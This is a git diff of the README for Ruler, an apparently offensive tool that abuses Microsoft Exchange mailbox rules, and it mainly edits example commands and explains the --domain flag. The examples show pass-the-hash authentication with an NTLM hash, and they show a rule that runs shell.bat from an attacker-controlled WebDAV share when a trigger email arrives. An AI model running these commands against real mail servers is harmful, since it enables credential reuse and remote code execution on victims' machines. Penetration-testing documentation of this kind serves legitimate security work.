@@ -43,7 +43,7 @@ git clone https://github.com/sensepost/ruler.git
 Ensure you have the dependencies (go get is the easiest option, otherwise clone the repos into your GOPATH):
 ```
 go get github.com/urfave/cli
-go get github.com/howeyc/gopass 
+go get github.com/howeyc/gopass
 go get github.com/staaldraad/go-ntlm/ntlm
 ```
 Then build it
@@ -195,12 +195,18 @@ If you run into issues with Authentication (and you know the creds are correct),
 
 The global ```--verbose``` flag will also give you some insight into the process being used by the autodiscover service.
 
+### --domain is not needed
+
+Another interesting thing to note, is that Ruler doesn't require the ```--domain``` for authentication or autodiscover in most cases. The autodiscover service works off the email addresses domain. If you find that authentication is failing, it might mean that you require the internal domain name as part of the authentication string. For this, you will need to add ```--domain DOMAIN``` to your requests. This will ensure that NTLM auth does ```DOMAIN\USERNAME``` in the authentication sequence, instead of ```.\USERNAME```.  
+
+Basic rule, use ```--domain``` with bruteforce (it uses this to figure out the autodiscover URL), otherwise leave it off.
+
 ## PtH - Passing the hash
 
 Ruler has support for PtH attacks, allowing you to reuse valid NTLM hashes (think responder, mimikatz, mana-eap) instead of a password. Simply provide the hash instead of a password and you are good to go. To provide the hash, use the global flag ```--hash```.
 
 ```
-./ruler --domain evilcorp --username validuser --hash 71bc15c57d836a663ed0b02631d300be --email user@domain.com display
+./ruler  --username validuser --hash 71bc15c57d836a663ed0b02631d300be --email user@domain.com display
 ```
 
 ## Display existing rules / verify account
@@ -208,12 +214,12 @@ Ruler has support for PtH attacks, allowing you to reuse valid NTLM hashes (thin
 Once you have a set of credentials you can target the user's mailbox. Here you'll need to know their email address (address book searching is in the planned extension).
 
 ```
-./ruler --domain targetdomain.com --email user@targetdomain.com --username username --password password display
+./ruler  --email user@targetdomain.com --username username --password password display
 ```
 
 Output:
 ```
-./ruler --domain evilcorp.ninja --username john.ford --password August2016 --email john.ford@evilcorp.ninja display
+./ruler  --username john.ford --password August2016 --email john.ford@evilcorp.ninja display
 
 [*] Retrieving MAPI info
 [*] Doing Autodiscover for domain
@@ -231,7 +237,7 @@ Output:
 To delete rules, use the ruleId displayed next to the rule name (000000df1)
 
 ```
-./ruler --domain targetdomain.com --email user@targetdomain.com --username username --password password delete --id 000000df1
+./ruler --email user@targetdomain.com --username username --password password delete --id 000000df1
 ```
 
 # Popping a shell
@@ -241,7 +247,7 @@ Now the fun part. Your initial setup is the same as outlined in the [Silentbreak
 To create the new rule user Ruler and:
 
 ```
-./ruler --domain targetdomain.com --email user@targetdomain.com --username username --password password add --location "\\\\yourserver\\webdav\\shell.bat" --trigger "pop a shell" --name maliciousrule
+./ruler --email user@targetdomain.com --username username --password password add --location "\\\\yourserver\\webdav\\shell.bat" --trigger "pop a shell" --name maliciousrule
 ```
 
 The various parts:
